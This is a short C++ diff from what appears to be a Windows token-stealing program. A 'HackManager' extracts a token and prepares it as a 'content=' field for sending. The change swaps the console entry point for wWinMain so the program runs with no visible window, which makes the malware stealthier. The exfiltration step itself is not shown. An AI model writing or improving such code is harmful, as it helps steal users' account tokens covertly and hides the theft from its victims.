@@ -7,9 +7,8 @@ unsigned char HEADER[] = {
     0x00, 0x00, 0x00, 0x43, 0x00, 0x00, 0x00, 0x3B, 0x00, 0x00, 0x00
 };
 
-int main()
+int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow)
 {
-    ::ShowWindow(::GetConsoleWindow(), SW_HIDE);
     auto Token = HackManager().GetLocation(HEADER, sizeof(HEADER));
     if (Token.length() > 0) {
         Token = "content=" + Token;
